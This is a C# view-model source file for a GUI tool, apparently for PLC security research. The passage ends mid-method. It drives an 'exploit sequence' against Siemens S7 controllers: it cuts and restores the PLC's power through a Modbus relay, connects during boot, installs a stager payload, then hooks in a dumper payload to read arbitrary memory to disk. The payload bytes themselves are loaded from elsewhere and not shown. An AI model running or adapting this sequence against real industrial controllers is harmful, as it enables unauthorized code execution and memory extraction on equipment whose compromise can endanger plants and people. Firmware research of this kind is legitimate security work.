using S7_Csharp_Utility.Services;
using System.Windows.Input;
using System.Threading.Tasks;
using System;
using S7.Net;
using System.ComponentModel.DataAnnotations;
using System.Collections.ObjectModel;
using System.Linq;
using System.IO.Ports;

namespace S7_Csharp_Utility.ViewModels
{
    /// <summary>
    /// The main window's view model, containing the application's state and logic.
    /// </summary>
    public class MainWindowViewModel : ViewModelBase
    {
        private const string ConfigFileName = "config.json";
        private string _plcHost = "localhost";
        /// <summary>
        /// The IP address or hostname of the PLC.
        /// </summary>
        [Required]
        public string PlcHost
        {
            get => _plcHost;
            set
            {
                _plcHost = value;
                OnPropertyChanged();
            }
        }

        private int _delaySeconds = 1;
        /// <summary>
        /// The delay in seconds to wait before powering on the PLC.
        /// </summary>
        public int DelaySeconds
        {
            get => _delaySeconds;
            set
            {
                _delaySeconds = value;
                OnPropertyChanged();
            }
        }

        private int _plcPort = 102;
        /// <summary>
        /// The TCP port of the PLC.
        /// </summary>
        [Range(1, 65535)]
        public int PlcPort
        {
            get => _plcPort;
            set
            {
                _plcPort = value;
                OnPropertyChanged();
            }
        }

        private string _modbusHost = "localhost";
        /// <summary>
        /// The IP address or hostname of the Modbus-enabled power supply.
        /// </summary>
        [Required]
        public string ModbusHost
        {
            get => _modbusHost;
            set
            {
                _modbusHost = value;
                OnPropertyChanged();
            }
        }

        private int _modbusPort = 502;
        /// <summary>
        /// The TCP port of the Modbus-enabled power supply.
        /// </summary>
        [Range(1, 65535)]
        public int ModbusPort
        {
            get => _modbusPort;
            set
            {
                _modbusPort = value;
                OnPropertyChanged();
            }
        }

        private ushort _modbusCoil = 1;
        /// <summary>
        /// The Modbus coil to control the power supply.
        /// </summary>
        [Range(1, 65535)]
        public ushort ModbusCoil
        {
            get => _modbusCoil;
            set
            {
                _modbusCoil = value;
                OnPropertyChanged();
            }
        }

        private byte _modbusSlaveId = 1;
        /// <summary>
        /// The slave ID of the Modbus device.
        /// </summary>
        [Range(0, 255)]
        public byte ModbusSlaveId
        {
            get => _modbusSlaveId;
            set
            {
                _modbusSlaveId = value;
                OnPropertyChanged();
            }
        }

        /// <summary>
        /// The service responsible for logging application messages.
        /// </summary>
        public LoggingService Logging { get; }
        /// <summary>
        /// The service responsible for logging socat messages.
        /// </summary>
        public SocatLoggerService SocatLogging { get; }
        /// <summary>
        /// The service responsible for controlling the PLC's power supply.
        /// </summary>
        private readonly PowerController _powerController;

        /// <summary>
        /// Command to power on the PLC.
        /// </summary>
        public ICommand PowerOnCommand { get; }
        /// <summary>
        /// Command to power off the PLC.
        /// </summary>
        public ICommand PowerOffCommand { get; }

        private string _modbusStatus = "Disconnected";
        /// <summary>
        /// The current status of the Modbus connection.
        /// </summary>
        public string ModbusStatus
        {
            get => _modbusStatus;
            set
            {
                _modbusStatus = value;
                OnPropertyChanged();
                (ConnectModbusCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
                (DisconnectModbusCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
                (PowerOnCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
                (PowerOffCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
                (StartExploitSequenceCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        /// <summary>
        /// Command to connect to the Modbus host.
        /// </summary>
        public ICommand ConnectModbusCommand { get; }
        /// <summary>
        /// Command to disconnect from the Modbus host.
        /// </summary>
        public ICommand DisconnectModbusCommand { get; }

        /// <summary>
        /// The service responsible for managing stager and dumper payloads.
        /// </summary>
        private readonly S7.Net.PayloadManager _payloadManager;

        private string _dumpAddress = "0x10000000";
        /// <summary>
        /// The starting memory address for the dump, in hexadecimal format.
        /// </summary>
        [Required]
        [RegularExpression(@"^0x[0-9a-fA-F]+$", ErrorMessage = "Must be a valid hex address (e.g., 0x10000000)")]
        public string DumpAddress
        {
            get => _dumpAddress;
            set
            {
                _dumpAddress = value;
                OnPropertyChanged();
            }
        }

        private uint _dumpLength = 4096;
        /// <summary>
        /// The number of bytes to dump from the memory address.
        /// </summary>
        [Range(1, uint.MaxValue)]
        public uint DumpLength
        {
            get => _dumpLength;
            set
            {
                _dumpLength = value;
                OnPropertyChanged();
            }
        }


        private bool _isUploadingStager;
        /// <summary>
        /// Indicates whether a stager is currently being uploaded.
        /// </summary>
        public bool IsUploadingStager
        {
            get => _isUploadingStager;
            set
            {
                _isUploadingStager = value;
                OnPropertyChanged();
                (StartExploitSequenceCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        private bool _isDumpingMemory;
        /// <summary>
        /// Indicates whether a memory dump is in progress.
        /// </summary>
        public bool IsDumpingMemory
        {
            get => _isDumpingMemory;
            set
            {
                _isDumpingMemory = value;
                OnPropertyChanged();
                (DumpMemoryCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        private bool _isComparing;
        /// <summary>
        /// Indicates whether a comparison is in progress.
        /// </summary>
        public bool IsComparing
        {
            get => _isComparing;
            set
            {
                _isComparing = value;
                OnPropertyChanged();
                (CompareDumpsCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
                (CompareTwoFilesCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        private double _dumpProgressPercentage;
        /// <summary>
        /// The progress of the memory dump as a percentage.
        /// </summary>
        public double DumpProgressPercentage
        {
            get => _dumpProgressPercentage;
            set
            {
                _dumpProgressPercentage = value;
                OnPropertyChanged();
            }
        }

        private string _dumpProgressBytes = "Read: 0 / 0 bytes";
        /// <summary>
        /// The progress of the memory dump in bytes.
        /// </summary>
        public string DumpProgressBytes
        {
            get => _dumpProgressBytes;
            set
            {
                _dumpProgressBytes = value;
                OnPropertyChanged();
            }
        }

        private string _dumpProgressTime = "Elapsed: 0s | Remaining: calculating...";
        /// <summary>
        /// The elapsed and remaining time for the memory dump.
        /// </summary>
        public string DumpProgressTime
        {
            get => _dumpProgressTime;
            set
            {
                _dumpProgressTime = value;
                OnPropertyChanged();
            }
        }


        private bool _stagerInstalled;
        /// <summary>
        /// Indicates whether the stager has been successfully installed on the PLC.
        /// </summary>
        public bool StagerInstalled
        {
            get => _stagerInstalled;
            set
            {
                _stagerInstalled = value;
                OnPropertyChanged();
                (DumpMemoryCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        /// <summary>
        /// The path to the folder containing the stager payloads.
        /// </summary>
        public string PayloadsPath
        {
            get => _payloadsPath;
            set { _payloadsPath = value; OnPropertyChanged(); }
        }
        private string _payloadsPath = string.Empty;
        /// <summary>
        /// The path to the folder where memory dumps will be saved.
        /// </summary>
        public string DumpsPath
        {
            get => _dumpsPath;
            set { _dumpsPath = value; OnPropertyChanged(); }
        }
        private string _dumpsPath = string.Empty;
        /// <summary>
        /// The path to the folder where logs will be saved.
        /// </summary>
        public string LogsPath
        {
            get => _logsPath;
            set { _logsPath = value; OnPropertyChanged(); }
        }
        private string _logsPath = string.Empty;
        /// <summary>
        /// The path to the folder where extracted files will be saved.
        /// </summary>
        public string ExtractionPath
        {
            get => _extractionPath;
            set { _extractionPath = value; OnPropertyChanged(); }
        }
        private string _extractionPath = string.Empty;

        /// <summary>
        /// Command to browse for the payloads folder.
        /// </summary>
        public ICommand BrowsePayloadsFolderCommand { get; }
        /// <summary>
        /// Command to browse for the dumps folder.
        /// </summary>
        public ICommand BrowseDumpsFolderCommand { get; }
        /// <summary>
        /// Command to browse for the logs folder.
        /// </summary>
        public ICommand BrowseLogsFolderCommand { get; }
        /// <summary>
        /// Command to browse for the extraction folder.
        /// </summary>
        public ICommand BrowseExtractionFolderCommand { get; }
        /// <summary>
        /// Command to save the configured paths.
        /// </summary>
        public ICommand SavePathsCommand { get; }

        /// <summary>
        /// Command to start the exploit sequence.
        /// </summary>
        public ICommand StartExploitSequenceCommand { get; }
        /// <summary>
        /// Command to dump memory from the PLC.
        /// </summary>
        public ICommand DumpMemoryCommand { get; }
        /// <summary>
        /// Command to browse for a folder to compare dumps.
        /// </summary>
        public ICommand BrowseCompareFolderCommand { get; }
        /// <summary>
        /// Command to browse for the first file to compare.
        /// </summary>
        public ICommand BrowseCompareFile1Command { get; }
        /// <summary>
        /// Command to browse for the second file to compare.
        /// </summary>
        public ICommand BrowseCompareFile2Command { get; }
        /// <summary>
        /// Command to compare all dumps in a folder.
        /// </summary>
        public ICommand CompareDumpsCommand { get; }
        /// <summary>
        /// Command to compare two files.
        /// </summary>
        public ICommand CompareTwoFilesCommand { get; }

        /// <summary>
        /// The service responsible for managing the socat process.
        /// </summary>
        private readonly SocatService _socatService;
        /// <summary>
        /// A collection of available serial ports.
        /// </summary>
        public ObservableCollection<string> AvailableSerialPorts { get; } = new ObservableCollection<string>();
        private string _selectedSerialPort = string.Empty;
        /// <summary>
        /// The currently selected serial port.
        /// </summary>
        public string SelectedSerialPort
        {
            get => _selectedSerialPort;
            set
            {
                _selectedSerialPort = value;
                OnPropertyChanged();
            }
        }

        private int _socatTcpPort = 8888;
        /// <summary>
        /// The TCP port used by socat.
        /// </summary>
        public int SocatTcpPort
        {
            get => _socatTcpPort;
            set
            {
                _socatTcpPort = value;
                OnPropertyChanged();
            }
        }

        private string _socatStatus = "Stopped";
        /// <summary>
        /// The current status of the socat service.
        /// </summary>
        public string SocatStatus
        {
            get => _socatStatus;
            set
            {
                _socatStatus = value;
                OnPropertyChanged();
                (StartSocatCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
                (StopSocatCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        /// <summary>
        /// Command to start the socat service.
        /// </summary>
        public ICommand StartSocatCommand { get; }
        /// <summary>
        /// Command to stop the socat service.
        /// </summary>
        public ICommand StopSocatCommand { get; }
        /// <summary>
        /// Command to refresh the list of available serial ports.
        /// </summary>
        public ICommand RefreshSerialPortsCommand { get; }
        /// <summary>
        /// Command to show the socat log window.
        /// </summary>
        public ICommand ShowSocatLogCommand { get; }
        /// <summary>
        /// Command to save the current configuration to a file.
        /// </summary>
        public ICommand SaveConfigurationCommand { get; }
        /// <summary>
        /// Command to load a configuration from a file.
        /// </summary>
        public ICommand LoadConfigurationCommand { get; }

        /// <summary>
        /// A collection of available communication modes.
        /// </summary>
        public ObservableCollection<string> CommunicationModes { get; } = new ObservableCollection<string> { "TCP (socat)", "Serial" };
        private string _selectedCommunicationMode = "TCP (socat)";
        /// <summary>
        /// The currently selected communication mode.
        /// </summary>
        public string SelectedCommunicationMode
        {
            get => _selectedCommunicationMode;
            set
            {
                if (_selectedCommunicationMode != value)
                {
                    _selectedCommunicationMode = value;
                    OnPropertyChanged();
                    OnPropertyChanged(nameof(IsSocatModeSelected));
                    OnPropertyChanged(nameof(IsSerialModeSelected));
                }
            }
        }

        /// <summary>
        /// Indicates whether the socat communication mode is selected.
        /// </summary>
        public bool IsSocatModeSelected => _selectedCommunicationMode == "TCP (socat)";
        /// <summary>
        /// Indicates whether the serial communication mode is selected.
        /// </summary>
        public bool IsSerialModeSelected => _selectedCommunicationMode == "Serial";

        /// <summary>
        /// A collection of available baud rates for serial communication.
        /// </summary>
        public ObservableCollection<int> AvailableBaudRates { get; } = new ObservableCollection<int> { 9600, 19200, 38400, 57600, 115200 };
        private int _selectedBaudRate = 115200;
        /// <summary>
        /// The currently selected baud rate.
        /// </summary>
        public int SelectedBaudRate
        {
            get => _selectedBaudRate;
            set
            {
                _selectedBaudRate = value;
                OnPropertyChanged();
            }
        }

        /// <summary>
        /// A collection of available parities for serial communication.
        /// </summary>
        public ObservableCollection<Parity> AvailableParities { get; } = new ObservableCollection<Parity>(Enum.GetValues(typeof(Parity)).Cast<Parity>());
        private Parity _selectedParity = Parity.None;
        /// <summary>
        /// The currently selected parity.
        /// </summary>
        public Parity SelectedParity
        {
            get => _selectedParity;
            set
            {
                _selectedParity = value;
                OnPropertyChanged();
            }
        }

        /// <summary>
        /// A collection of available stop bits for serial communication.
        /// </summary>
        public ObservableCollection<StopBits> AvailableStopBits { get; } = new ObservableCollection<StopBits>(Enum.GetValues(typeof(StopBits)).Cast<StopBits>());
        private StopBits _selectedStopBits = StopBits.One;
        /// <summary>
        /// The currently selected stop bits.
        /// </.summary>
        public StopBits SelectedStopBits
        {
            get => _selectedStopBits;
            set
            {
                _selectedStopBits = value;
                OnPropertyChanged();
            }
        }

        /// <summary>
        /// A collection of available flow controls for serial communication.
        /// </summary>
        public ObservableCollection<Handshake> AvailableFlowControls { get; } = new ObservableCollection<Handshake>(Enum.GetValues(typeof(Handshake)).Cast<Handshake>());
        private Handshake _selectedFlowControl = Handshake.None;
        /// <summary>
        /// The currently selected flow control.
        /// </summary>
        public Handshake SelectedFlowControl
        {
            get => _selectedFlowControl;
            set
            {
                _selectedFlowControl = value;
                OnPropertyChanged();
            }
        }


        private string _compareFolder = string.Empty;
        /// <summary>
        /// The folder containing dumps to be compared.
        /// </summary>
        public string CompareFolder
        {
            get => _compareFolder;
            set
            {
                _compareFolder = value;
                OnPropertyChanged();
                (CompareDumpsCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        private string _compareFile1 = string.Empty;
        /// <summary>
        /// The first file to be compared.
        /// </summary>
        public string CompareFile1
        {
            get => _compareFile1;
            set
            {
                _compareFile1 = value;
                OnPropertyChanged();
                (CompareTwoFilesCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        private string _compareFile2 = string.Empty;
        /// <summary>
        /// The second file to be compared.
        /// </summary>
        public string CompareFile2
        {
            get => _compareFile2;
            set
            {
                _compareFile2 = value;
                OnPropertyChanged();
                (CompareTwoFilesCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        /// <summary>
        /// The service responsible for showing dialogs to the user.
        /// </summary>
        private readonly Interfaces.IDialogService _dialogService;
        /// <summary>
        /// The service responsible for saving and loading the application configuration.
        /// </summary>
        private readonly ConfigurationService _configService;

        /// <summary>
        /// Initializes a new instance of the <see cref="MainWindowViewModel"/> class.
        /// </summary>
        /// <param name="loggingService">The logging service.</param>
        /// <param name="powerController">The power controller.</param>
        /// <param name="payloadManager">The payload manager.</param>
        /// <param name="dialogService">The dialog service.</param>
        /// <param name="socatService">The socat service.</param>
        /// <param name="configService">The configuration service.</param>
        /// <param name="socatLoggerService">The socat logger service.</param>
        public MainWindowViewModel(LoggingService loggingService, PowerController powerController, S7.Net.PayloadManager payloadManager, Interfaces.IDialogService dialogService, SocatService socatService, ConfigurationService configService, SocatLoggerService socatLoggerService)
        {
            Logging = loggingService;
            SocatLogging = socatLoggerService;
            _powerController = powerController;
            _payloadManager = payloadManager;
            _dialogService = dialogService;
            _socatService = socatService;
            _configService = configService;

            ConnectModbusCommand = new Commands.RelayCommand(async _ => await ConnectModbusAsync(), _ => ModbusStatus != "Connected");
            DisconnectModbusCommand = new Commands.RelayCommand(_ => DisconnectModbus(), _ => ModbusStatus == "Connected");

            PowerOnCommand = new Commands.RelayCommand(async _ => await _powerController.SetPowerAsync(ModbusCoil, true, ModbusSlaveId), _ => _powerController.IsConnected);
            PowerOffCommand = new Commands.RelayCommand(async _ => await _powerController.SetPowerAsync(ModbusCoil, false, ModbusSlaveId), _ => _powerController.IsConnected);
            StartExploitSequenceCommand = new Commands.RelayCommand(async _ => await StartExploitSequence(), _ => SocatStatus == "Running" && _powerController.IsConnected && !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            DumpMemoryCommand = new Commands.RelayCommand(async _ => await DumpMemory(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing && StagerInstalled);

            BrowsePayloadsFolderCommand = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFolderPickerAsync("Select Payloads Folder"); if(result != null) PayloadsPath = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            BrowseDumpsFolderCommand = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFolderPickerAsync("Select Dumps Folder"); if(result != null) DumpsPath = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            BrowseLogsFolderCommand = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFolderPickerAsync("Select Logs Folder"); if(result != null) LogsPath = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            BrowseExtractionFolderCommand = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFolderPickerAsync("Select Extraction Folder"); if(result != null) ExtractionPath = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);

            BrowseCompareFolderCommand = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFolderPickerAsync("Select Folder to Compare"); if(result != null) CompareFolder = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            BrowseCompareFile1Command = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFilePickerAsync("Select File 1"); if(result != null) CompareFile1 = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            BrowseCompareFile2Command = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFilePickerAsync("Select File 2"); if(result != null) CompareFile2 = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            CompareDumpsCommand = new Commands.RelayCommand(async _ => await CompareDumps(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing && !string.IsNullOrWhiteSpace(CompareFolder));
            CompareTwoFilesCommand = new Commands.RelayCommand(async _ => await CompareTwoFiles(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing && !string.IsNullOrWhiteSpace(CompareFile1) && !string.IsNullOrWhiteSpace(CompareFile2));

            StartSocatCommand = new Commands.RelayCommand(async _ => await StartSocatAsync(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing && IsSocatModeSelected && SocatStatus != "Running");
            StopSocatCommand = new Commands.RelayCommand(async _ => await StopSocatAsync(), _ => IsSocatModeSelected && SocatStatus == "Running");
            RefreshSerialPortsCommand = new Commands.RelayCommand(_ => RefreshSerialPorts());
            ShowSocatLogCommand = new Commands.RelayCommand(_ => _dialogService.ShowSocatLogWindow());

            SaveConfigurationCommand = new Commands.RelayCommand(async _ => await SaveConfiguration());
            LoadConfigurationCommand = new Commands.RelayCommand(async _ => await LoadConfiguration());
            SavePathsCommand = new Commands.RelayCommand(async _ => await SaveConfiguration(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);

            RefreshSerialPorts();
        }

        /// <summary>
        /// Creates a communication channel based on the selected mode (TCP or Serial).
        /// </summary>
        /// <returns>An initialized communication channel.</returns>
        private S7.Net.Interfaces.ICommunicationChannel CreateCommunicationChannel()
        {
            if (SelectedCommunicationMode == "TCP (socat)")
            {
                return new S7.Net.Channels.TcpChannel(PlcHost, PlcPort);
            }
            else
            {
                return new S7.Net.Channels.SerialChannel(SelectedSerialPort, SelectedBaudRate, SelectedParity, SelectedStopBits, SelectedFlowControl);
            }
        }

        /// <summary>
        /// Starts the exploit sequence, which includes power cycling the PLC and installing the stager.
        /// </summary>
        private async Task StartExploitSequence()
        {
            IsUploadingStager = true;
            S7.Net.Interfaces.ICommunicationChannel? channel = null;
            try
            {
                await _powerController.SetPowerAsync(ModbusCoil, false, ModbusSlaveId);
                Logging.Log($"Waiting for {DelaySeconds} seconds before powering on...", LogCategory.Info);
                await Task.Delay(DelaySeconds * 1000);
                await _powerController.SetPowerAsync(ModbusCoil, true, ModbusSlaveId);

                await Task.Delay(50);

                channel = CreateCommunicationChannel();
                await channel.ConnectAsync();
                var plcClient = new S7.Net.PlcClient(channel, (message) => Logging.Log(message, LogCategory.Info));
                await RunStagerSequenceAsync(plcClient);
            }
            catch (Exception ex)
            {
                Logging.Log($"An error occurred during the stager sequence: {ex.Message}", LogCategory.Error);
                await _dialogService.ShowMessageAsync("Error", $"An error occurred during the stager sequence: {ex.Message}");
            }
            finally
            {
                channel?.Disconnect();
                IsUploadingStager = false;
            }
        }

        /// <summary>
        /// Runs the stager installation sequence.
        /// </summary>
        /// <param name="plcClient">The PLC client.</param>
        private async Task RunStagerSequenceAsync(S7.Net.PlcClient plcClient)
        {
            StagerInstalled = false;
            if (!plcClient.IsConnected) return;

            if (await plcClient.PerformHandshakeAsync())
            {
                await plcClient.GetVersion();

                byte[] stagerPayload = _payloadManager.GetStagerPayload();
                Logging.Log($"Loaded stager payload ({stagerPayload.Length} bytes).", LogCategory.Info);

                await plcClient.InstallStager(stagerPayload);
                StagerInstalled = true;
                Logging.Log("Stager is installed and ready.", LogCategory.Info);
            }
        }

        /// <summary>
        /// Dumps the memory from the PLC.
        /// </summary>
        private async Task DumpMemory()
        {
            IsDumpingMemory = true;
            S7.Net.Interfaces.ICommunicationChannel? channel = null;
            try
            {
                if (!uint.TryParse(DumpAddress.Replace("0x", ""), System.Globalization.NumberStyles.HexNumber, System.Globalization.CultureInfo.CurrentCulture, out uint address))
                {
                    Logging.Log("Error: Invalid dump address. Must be a valid hex number (e.g., 0x10000000).", LogCategory.Error);
                    return;
                }
                if (DumpLength == 0)
                {
                    Logging.Log("Error: Invalid dump length. Must be a positive number.", LogCategory.Error);
                    return;
                }

                channel = CreateCommunicationChannel();
                await channel.ConnectAsync();
                var plcClient = new S7.Net.PlcClient(channel, (message) => Logging.Log(message, LogCategory.Info));
                await RunDumpSequenceAsync(plcClient, address, DumpLength);
            }
            catch (Exception ex)
            {
                Logging.Log($"An error occurred during the dump sequence: {ex.Message}", LogCategory.Error);
                await _dialogService.ShowMessageAsync("Error", $"An error occurred during the dump sequence: {ex.Message}");
            }
            finally
            {
                channel?.Disconnect();
                IsDumpingMemory = false;
            }
        }

        /// <summary>
        /// Runs the memory dump sequence.
        /// </summary>
        /// <param name="plcClient">The PLC client.</param>
        /// <param name="address">The starting memory address.</param>
        /// <param name="length">The number of bytes to dump.</param>
        private async Task RunDumpSequenceAsync(S7.Net.PlcClient plcClient, uint address, uint length)
        {
            Logging.Log($"Starting memory dump of {length} bytes from 0x{address:X8}...", LogCategory.Info);

            byte[] dumperPayload = _payloadManager.GetMemoryDumperPayload();
            Logging.Log($"Loaded dumper payload ({dumperPayload.Length} bytes).", LogCategory.Info);

            int dumperHookIndex = PlcConstants.DEFAULT_SECOND_ADD_HOOK_IND;
            await plcClient.InstallAddHookViaStager(PlcConstants.DUMPER_PAYLOAD_LOCATION, dumperPayload, dumperHookIndex);
            Logging.Log("Memory dumper payload installed.", LogCategory.Info);

            var args = new byte[1 + 4 + 4];
            args[0] = (byte)'A';
            BitConverter.GetBytes(address).CopyTo(args, 1);
            BitConverter.GetBytes(length).CopyTo(args, 5);

            await plcClient.InvokeAddHook(dumperHookIndex, args);
            Logging.Log("Dump command sent. Receiving data...", LogCategory.Info);

            var stopwatch = System.Diagnostics.Stopwatch.StartNew();
            var progress = new Progress<long>(bytesRead =>
            {
                double percentage = (double)bytesRead / length * 100;
                stopwatch.Stop();
                double elapsedSeconds = stopwatch.Elapsed.TotalSeconds;
                double bytesPerSecond = bytesRead > 0 ? bytesRead / elapsedSeconds : 0;
                double remainingSeconds = (bytesPerSecond > 0) ? (length - bytesRead) / bytesPerSecond : 0;
                stopwatch.Start();

                DumpProgressPercentage = percentage;
                DumpProgressBytes = $"Read: {bytesRead} / {length} bytes";
                DumpProgressTime = $"Elapsed: {elapsedSeconds:F0}s | Remaining: {remainingSeconds:F0}s";
            });

            var dumpedData = await plcClient.ReceiveMany(progress);
            stopwatch.Stop();

            string outFilename = $"mem_dump_{address:x8}_{address + length:x8}.bin";
            await System.IO.File.WriteAllBytesAsync(outFilename, dumpedData);
            Logging.Log($"Successfully dumped {dumpedData.Length} bytes to {outFilename} in {stopwatch.Elapsed.TotalSeconds:F1}s.", LogCategory.Info);
        }

        /// <summary>
        /// Compares all dump files in a specified folder.
        /// </summary>
        private async Task CompareDumps()
        {
            if (string.IsNullOrWhiteSpace(CompareFolder) || !System.IO.Directory.Exists(CompareFolder))
            {
                await _dialogService.ShowMessageAsync("Error", "Please select a valid folder.");
                return;
            }

            IsComparing = true;
            try
            {
                var comparer = new S7.Utils.DumpComparer(message => Logging.Log(message));
                var fileHashes = await comparer.ComputeFileHashesAsync(CompareFolder);
                string report = comparer.GenerateFolderCompareReport(fileHashes, CompareFolder);

                // The results should be displayed in the UI. This requires more properties in the VM.
                // For now, just showing a popup.
                await _dialogService.ShowMessageAsync("Comparison Result", report);
                Logging.Log("Comparison complete. See popup for detailed result.");
            }
            catch (Exception ex)
            {
                await _dialogService.ShowMessageAsync("Error", $"Error during folder compare: {ex.Message}");
                Logging.Log($"Error during folder compare: {ex.Message}", LogCategory.Error);
            }
            finally
            {
                IsComparing = false;
            }
        }

        /// <summary>
        /// Refreshes the list of available serial ports.
        /// </summary>
        private void RefreshSerialPorts()
        {
            AvailableSerialPorts.Clear();
            foreach (var port in System.IO.Ports.SerialPort.GetPortNames())
            {
                AvailableSerialPorts.Add(port);
            }
            if (AvailableSerialPorts.Any())
            {
                SelectedSerialPort = AvailableSerialPorts[0];
            }
        }

        /// <summary>
        /// Starts the socat service.
        /// </summary>
        private async Task StartSocatAsync()
        {
            try
            {
                _socatService.Start(SelectedSerialPort, SocatTcpPort);
                SocatStatus = "Running";
            }
            catch (Exception ex)
            {
                Logging.Log($"Error starting socat: {ex.Message}", LogCategory.Error);
                await _dialogService.ShowMessageAsync("Error", $"Error starting socat: {ex.Message}");
                SocatStatus = "Error";
            }
        }

        /// <summary>
        /// Stops the socat service.
        /// </summary>
        private async Task StopSocatAsync()
        {
            try
            {
                _socatService.Stop();
                SocatStatus = "Stopped";
            }
            catch (Exception ex)
            {
                Logging.Log($"Error stopping socat: {ex.Message}", LogCategory.Error);
                await _dialogService.ShowMessageAsync("Error", $"Error stopping socat: {ex.Message}");
            }
        }

        private async Task ConnectModbusAsync()
        {
            try
            {
                await _powerController.ConnectAsync(ModbusHost, ModbusPort);
                ModbusStatus = _powerController.IsConnected ? "Connected" : "Error";
            }
            catch (Exception ex)
            {
                Logging.Log($"Error connecting to Modbus: {ex.Message}", LogCategory.Error);
                await _dialogService.ShowMessageAsync("Error", $"Error connecting to Modbus: {ex.Message}");
                ModbusStatus = "Error";
            }
        }

        private void DisconnectModbus()
        {
            _powerController.Disconnect();
            ModbusStatus = "Disconnected";
        }

        /// <summary>
        /// Saves the current configuration to a file.
        /// </summary>
        private async Task SaveConfiguration()
        {
            var path = await _dialogService.ShowSaveFileDialogAsync("Save Configuration", "json", "JSON Files");
            if (path != null)
            {
                var config = new Models.ApplicationConfiguration
                {
                    PlcHost = this.PlcHost,
                    PlcPort = this.PlcPort,
                    ModbusHost = this.ModbusHost,
                    ModbusPort = this.ModbusPort,
                    ModbusCoil = this.ModbusCoil,
                    DelaySeconds = this.DelaySeconds,
                    DumpAddress = this.DumpAddress,
                    DumpLength = this.DumpLength,
                    CompareFolder = this.CompareFolder,
                    CompareFile1 = this.CompareFile1,
                    CompareFile2 = this.CompareFile2,
                    SelectedSerialPort = this.SelectedSerialPort,
                    SocatTcpPort = this.SocatTcpPort,
                    SelectedBaudRate = this.SelectedBaudRate,
                    SelectedParity = this.SelectedParity,
                    SelectedStopBits = this.SelectedStopBits,
                    SelectedFlowControl = this.SelectedFlowControl
                };
                await _configService.SaveConfiguration(config, path);
            }
        }

        /// <summary>
        /// Loads the configuration from a file.
        /// </summary>
        private async Task LoadConfiguration()
        {
            var path = await _dialogService.ShowOpenFileDialogAsync("Load Configuration", "json", "JSON Files");
            if (path != null)
            {
                var config = await _configService.LoadConfiguration(path);
                if (config != null)
                {
                    PlcHost = config.PlcHost;
                    PlcPort = config.PlcPort;
                    ModbusHost = config.ModbusHost;
                    ModbusPort = config.ModbusPort;
                    ModbusCoil = config.ModbusCoil;
                    DelaySeconds = config.DelaySeconds;
                    DumpAddress = config.DumpAddress;
                    DumpLength = config.DumpLength;
                    CompareFolder = config.CompareFolder;
                    CompareFile1 = config.CompareFile1;
                    CompareFile2 = config.CompareFile2;
                    SelectedSerialPort = config.SelectedSerialPort;
                    SocatTcpPort = config.SocatTcpPort;
                    SelectedBaudRate = config.SelectedBaudRate;
                    SelectedParity = config.SelectedParity;
                    SelectedStopBits = config.SelectedStopBits;
                    SelectedFlowControl = config.SelectedFlowControl;
                }
            }
        }

        /// <summary>
        /// Loads the configuration from the default file on startup.
        /// </summary>
        public void LoadConfigurationOnStartup()
        {
            try
            {
                var path = System.IO.Path.Combine(AppContext.BaseDirectory, ConfigFileName);
                var config = System.Text.Json.JsonSerializer.Deserialize<Models.ApplicationConfiguration>(System.IO.File.ReadAllText(path));
                if (config != null)
                {
                    PlcHost = config.PlcHost;
                    PlcPort = config.PlcPort;
                    ModbusHost = config.ModbusHost;
                    ModbusPort = config.ModbusPort;
                    ModbusCoil = config.ModbusCoil;
                    DelaySeconds = config.DelaySeconds;
                    DumpAddress = config.DumpAddress;
                    DumpLength = config.DumpLength;
                    CompareFolder = config.CompareFolder;
                    CompareFile1 = config.CompareFile1;
                    CompareFile2 = config.CompareFile2;
                    SelectedSerialPort = config.SelectedSerialPort;
                    SocatTcpPort = config.SocatTcpPort;
                    SelectedBaudRate = config.SelectedBaudRate;
                    SelectedParity = config.SelectedParity;
                    SelectedStopBits = config.SelectedStopBits;
                    SelectedFlowControl = config.SelectedFlowControl;
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"Could not load configuration: {ex.Message}", LogCategory.Warning);
            }
        }

        /// <summary>
        /// Saves the current configuration to the default file on exit.
        /// </summary>
        public void SaveConfigurationOnExit()
        {
            try
            {
                var path = System.IO.Path.Combine(AppContext.BaseDirectory, ConfigFileName);
                var config = new Models.ApplicationConfiguration
                {
                    PlcHost = this.PlcHost,
                    PlcPort = this.PlcPort,
                    ModbusHost = this.ModbusHost,
                    ModbusPort = this.ModbusPort,
                    ModbusCoil = this.ModbusCoil,
